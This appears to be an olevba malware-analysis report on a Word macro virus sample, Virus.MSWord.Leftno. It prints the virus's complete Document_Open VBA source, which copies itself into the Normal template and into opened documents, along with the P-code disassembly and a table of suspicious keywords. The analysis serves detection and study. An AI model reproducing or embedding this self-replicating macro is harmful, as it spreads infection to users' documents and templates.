olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Leftno
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Leftno - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): If Left(MacroContainer, 2) = "No" Then Set H = NormalTemplate.VBProject.VBComponents(1).CodeModule: Set NH = ActiveDocument.VBProject.VBComponents(1).CodeModule Else Set H = ActiveDocument.VBProject.VBComponents(1).CodeModule: Set NH = NormalTemplate.VBProject.VBComponents(1).CodeModule
If NH.countoflines <> 3 Then NH.deletelines 1, NH.countoflines: S = H.lines(1, 3): NH.Addfromstring S
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Leftno
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1499 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	Ld MacroContainer 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 "No"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set H 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NH 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set H 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NH 
' 	EndIf 
' Line #1:
' 	Ld NH 
' 	MemLd countoflines 
' 	LitDI2 0x0003 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NH 
' 	MemLd countoflines 
' 	Ld NH 
' 	ArgsMemCall deletelines 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	Ld H 
' 	ArgsMemLd lines 0x0002 
' 	St S 
' 	BoS 0x0000 
' 	Ld S 
' 	Ld NH 
' 	ArgsMemCall Addfromstring 0x0001 
' 	EndIf 
' Line #2:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

